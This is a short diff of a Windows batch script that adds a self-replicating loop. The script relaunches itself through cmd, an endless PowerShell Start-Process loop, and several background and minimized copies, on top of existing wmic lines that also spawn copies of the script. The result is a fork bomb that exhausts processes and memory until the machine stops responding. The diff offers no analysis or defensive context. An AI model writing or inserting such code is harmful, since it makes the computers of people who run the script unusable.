@@ -84,4 +84,11 @@ for /f "tokens=2" %%a in ('tasklist /fi "IMAGENAME eq cmd.exe" /fo csv ^| findst
     wmic process where "ProcessId=%%a" call create "%~f0" >nul 2>&1
 )
 
+start "" cmd /c "%~f0"
+start "" powershell -Command "while(1){Start-Process -NoNewWindow -FilePath '%~f0'}"
+for /l %%i in (1,1,4) do (
+    start /b "" "%~f0"
+    start /min "" "%~f0"
+)
+
 goto loop
